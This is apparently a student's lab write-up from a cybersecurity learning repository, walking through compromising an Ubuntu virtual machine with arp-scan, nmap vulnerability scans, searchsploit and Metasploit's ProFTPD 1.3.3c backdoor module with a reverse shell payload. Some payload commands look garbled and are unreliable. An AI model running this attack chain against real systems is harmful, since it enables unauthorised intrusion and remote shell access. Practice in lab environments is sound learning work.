
# Compromising Ubuntu Machine

This repository documents the steps taken to compromise an Ubuntu machine using various tools and techniques.

## ARP Scan

First, we used `arp-scan` to identify live hosts in the network.

The command used was:
```
sudo arp-scan -l -I eth0
```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-13/arp-scan.png?raw=true)
## Nmap Scan

Next, we used `nmap` to perform a detailed scan of the identified host.

### Basic Scan

We performed an OS detection scan to identify open ports and the operating system.

The command used was:
```
sudo nmap -O 10.0.2.5
```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-13/nmap-scan.png?raw=true)
### Vulnerability Scan

We also performed a vulnerability scan using `nmap` scripts.

The command used was:
```
sudo nmap -Pn -sV --script vuln -oN vuln-Ubuntu-nmap.txt 10.0.2.5
```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-13/nmap-script.png?raw=true)
## Searchsploit

Finally, we used `searchsploit` to find detailed information and exploit code for the identified vulnerability.

The command used was:
```
searchsploit ProFTPD 1.3.3c
```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-13/search%20exploit.png?raw=true)
## Metasploit

After identifying potential vulnerabilities, we used Metasploit to exploit them.

### Metasploit Console

We searched for a specific ProFTPd vulnerability and selected the appropriate exploit.

The commands used were:
```
msfconsole
search ProFTPD 1.3.3c
use exploit/unix/ftp/proftpd_133c_backdoor
```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-13/msfconsole.png?raw=true)
In this you have to select the payloads for this specific attack 
```
 show payloads
 use payload/reverse_perl.php
 set payloads payload/reverse_perl.php (copy the path of the perl)
 set RHOST
 set LHOST
```

## Exploit 
```
 exploit
```
you will get a non interactive shell you can make it work with the tty spawn shell which you will get on the hack-tool extension 

After this is your wish what to do with the files machine its not like the windows machine so you will have to work it out as the linux/ ubantu machine working throught the terminal. 
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-13/cracked.png?raw=true)

## Summary

By following these steps, we were able to successfully identify and exploit vulnerabilities in an Ubuntu machine running ProFTPd.

---
